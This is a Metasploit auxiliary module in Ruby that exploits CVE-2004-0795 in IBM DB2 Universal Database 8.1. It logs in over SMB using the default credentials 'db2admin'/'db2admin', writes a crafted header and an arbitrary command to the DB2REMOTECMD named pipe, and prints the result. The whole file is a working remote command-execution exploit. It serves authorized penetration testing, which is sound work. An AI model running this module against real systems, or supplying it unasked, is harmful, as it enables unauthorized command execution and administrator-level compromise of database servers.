##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'IBM DB2 db2rcmd.exe Command Execution Vulnerability',
      'Description'    => %q{
          This module exploits a vulnerability in the Remote Command Server
          component in IBM's DB2 Universal Database 8.1. An authenticated
          attacker can send arbitrary commands to the DB2REMOTECMD named pipe
          which could lead to administrator privileges.
      },
      'Author'         => [ 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2004-0795' ],
          [ 'OSVDB', '4180' ],
          [ 'BID', '9821' ],
        ],
      'DisclosureDate' => 'Mar 4 2004'))

      register_options(
        [
          OptString.new('CMD', [ true, 'The command to execute', 'ver']),
          OptString.new('SMBUser', [ true, 'The username to authenticate as', 'db2admin']),
          OptString.new('SMBPass', [ true, 'The password for the specified username', 'db2admin'])
        ])
  end

  def run

    print_status("Connecting to the server...")
    connect()

    print_status("Authenticating as user '#{datastore['SMBUser']}' with pass '#{datastore['SMBPass']}'...")

    # Connect with a valid user/pass. if not, then bail.
    begin
      smb_login()
    rescue ::Exception => e
      print_error("Error: #{e}")
      disconnect
      return
    end

    # Have it so our command arg is convenient to call.
    rcmd = datastore['CMD']

    print_status("Connecting to named pipe \\DB2REMOTECMD...")

    # If the pipe doesn't exist, bail.
    begin
      pipe = simple.create_pipe('\\DB2REMOTECMD')
    rescue ::Exception => e
      print_error("Error: #{e}")
      disconnect
      return
    end

    # If we get this far, do the dance.

    fid = pipe.file_id

    # Need to make a Trans2 request with the param of 'QUERY_FILE_INFO' keeping our file_id
    trans2 = simple.client.trans2(0x0007, [fid, 1005].pack('vv'), '')

    # Write to the pipe, our command length comes into play.
    pipe.write([0x00000001].pack('V') + "DB2" + "\x00" * 525 + [rcmd.length].pack('V'))
    # Send off our command
    pipe.write(rcmd)

    # Read from the pipe and give us the data.
    res = pipe.read()
    print_line(res)

    # Close the named pipe and disconnect from the socket.
    pipe.close
    disconnect

  end
end
